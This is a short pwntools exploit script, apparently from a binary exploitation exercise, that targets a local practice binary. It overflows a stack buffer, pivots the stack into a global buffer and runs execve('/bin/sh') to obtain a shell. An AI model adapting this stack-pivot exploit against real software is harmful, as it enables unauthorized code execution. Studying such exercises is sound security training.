from pwn import *


binary = "../x86_binaries/x86_no_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
SYS_EXECVE = 0x3b

# get win() leak
win_addr = int(p.readline().strip(),16)
print(f'win(): {hex(win_addr)}')

# fill "new stack" with data needed to exec "/bin/sh"
new_stack = flat(
    p64(0),                                 # rbp
    p64(elf.sym['win']+4),                  # skip win() function prologue
    p64(next(elf.search(b'/bin/sh\x00'))),  # rdi
    p64(0),                                 # rsi
    p64(0),                                 # rdx
    p64(SYS_EXECVE),                        # rax (sys_execve)
).ljust(0x40, b'a')
p.send(new_stack)

# exploit stack overflow
payload = flat(
    # padding
    b'a'*0x20,
    p64(elf.sym['global_buf']),

    # stack pivot gadget
    elf.sym['vuln']+31,                     # leave; ret
)
p.sendline(payload)
p.interactive()